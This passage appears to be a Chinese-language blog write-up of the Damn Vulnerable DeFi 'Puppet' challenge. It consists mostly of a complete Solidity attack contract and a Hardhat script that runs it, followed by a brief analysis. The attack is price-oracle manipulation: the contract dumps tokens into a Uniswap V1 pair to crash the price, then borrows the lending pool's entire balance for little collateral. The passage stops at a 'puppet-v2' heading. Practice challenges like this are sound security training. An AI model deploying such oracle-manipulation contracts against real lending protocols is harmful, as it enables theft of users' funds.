&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// SPDX-License-Identifier: MIT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pragma solidity ^0.8.0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import &amp;quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import &amp;quot;hardhat/console.sol&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Interaface code:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@private&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@constant&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def getInputPrice(input_amount: uint256, input_reserve: uint256, output_reserve: uint256) -&amp;gt; uint256:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    assert input_reserve &amp;gt; 0 and output_reserve &amp;gt; 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    input_amount_with_fee: uint256 = input_amount * 997&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    numerator: uint256 = input_amount_with_fee * output_reserve&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    denominator: uint256 = (input_reserve * 1000) + input_amount_with_fee&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return numerator / denominator&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@private&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def tokenToEthInput(tokens_sold: uint256, min_eth: uint256(wei), deadline: timestamp, buyer: address, recipient: address) -&amp;gt; uint256(wei):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    assert deadline &amp;gt;= block.timestamp and (tokens_sold &amp;gt; 0 and min_eth &amp;gt; 0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    token_reserve: uint256 = self.token.balanceOf(self)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eth_bought: uint256 = self.getInputPrice(tokens_sold, token_reserve, as_unitless_number(self.balance))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wei_bought: uint256(wei) = as_wei_value(eth_bought, &amp;#x27;wei&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    assert wei_bought &amp;gt;= min_eth&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    send(recipient, wei_bought)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    assert self.token.transferFrom(buyer, self, tokens_sold)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    log.EthPurchase(buyer, tokens_sold, wei_bought)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return wei_bought&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;interface IUniswapExchangeV1 &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function tokenToEthTransferInput(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint256 tokens_sold,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint256 min_eth,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint256 deadline,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        address recipient&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ) external returns (uint256);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;interface IPool &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function borrow(uint256 amount, address recipient) external payable;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;contract PuppetPoolExploit &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    In before_setting:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uint256 immutable SELL_DVT_AMOUNT = 1000 ether;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uint256 immutable DEPOSIT_FACTOR = 2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uint256 immutable BORROW_DVT_AMOUNT = 100000 ether;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    IUniswapExchangeV1 immutable UniExchange;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    IERC20 immutable token;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    IPool immutable pool;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    address immutable player;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    /*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Basic information in PupetPool.sol:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    uint256 public constant DEPOSIT_FACTOR = 2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    address public immutable uniswapPair;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DamnValuableToken public immutable token;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    constructor(address _token, address _pair, address _pool) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        token = IERC20(_token);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pool = IPool(_pool);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        UniExchange = IUniswapExchangeV1(_pair);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        player = msg.sender;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function exploit() external payable &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        require(msg.sender == player);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // Dump DVT to the Uniswap Pool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        token.approve(address(UniExchange), SELL_DVT_AMOUNT);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        UniExchange.tokenToEthTransferInput(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            SELL_DVT_AMOUNT,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            9,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            block.timestamp,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            address(this)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        // Calculate and return callatrral&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint256 price = (address(UniExchange).balance * (10 ** 18)) /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            token.balanceOf(address(UniExchange));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        uint256 depositRequired = (BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR) /&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            10 ** 18; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        //这部分代码用于输出调试信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        console.log(&amp;quot;contract ETH balance:&amp;quot;, address(this).balance);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        console.log(&amp;quot;DVT price:&amp;quot;, price);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        console.log(&amp;quot;Deposit Required:&amp;quot;, depositRequired);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        pool.borrow&amp;#123;value: depositRequired&amp;#125;(BORROW_DVT_AMOUNT, player);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    receive() external payable &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;执行操作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;it&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Execution&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; (&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/** CODE YOUR SOLUTION HERE */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        [, , &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;anotherPlayer&lt;/span&gt;] = &lt;span class=&#34;keyword&#34;&gt;await&lt;/span&gt; ethers.&lt;span class=&#34;title function_&#34;&gt;getSigners&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;PuppetExploitFactory&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;await&lt;/span&gt; ethers.&lt;span class=&#34;title function_&#34;&gt;getContractFactory&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;PuppetPoolExploit&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;anotherPlayer&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;PuppetExploit&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;PuppetExploitFactory&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;deploy&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            token.&lt;span class=&#34;property&#34;&gt;address&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            uniswapExchange.&lt;span class=&#34;property&#34;&gt;address&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            lendingPool.&lt;span class=&#34;property&#34;&gt;address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        token.&lt;span class=&#34;title function_&#34;&gt;connect&lt;/span&gt;(player).&lt;span class=&#34;title function_&#34;&gt;transfer&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;PuppetExploit&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;address&lt;/span&gt;, &lt;span class=&#34;variable constant_&#34;&gt;PLAYER_INITIAL_TOKEN_BALANCE&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;PuppetExploit&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;exploit&lt;/span&gt;(&amp;#123; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;11n&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;10n&lt;/span&gt; ** &lt;span class=&#34;number&#34;&gt;18n&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;await&lt;/span&gt; token.&lt;span class=&#34;title function_&#34;&gt;connect&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;anotherPlayer&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;transfer&lt;/span&gt;(player.&lt;span class=&#34;property&#34;&gt;address&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;await&lt;/span&gt; token.&lt;span class=&#34;title function_&#34;&gt;balanceOf&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;anotherPlayer&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;address&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;分析&lt;br&gt;
本题设计到一个 uniswapV1 的漏洞，因为题目合约的报价完全依赖于 uniswapPair ，所以我们可以针对一个 uniswapPair 实例存入我们的 PLAYER_INITIAL_TOKEN_BALANCE ， 这会使得价格被瞬间破坏，之后只需执行 borrow 即可。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;puppet-v2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#puppet-v2&#34;&gt;#&lt;/a&gt; puppet-v2&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;攻击合约：&lt;/p&gt;
&lt;/blockquote&gt;
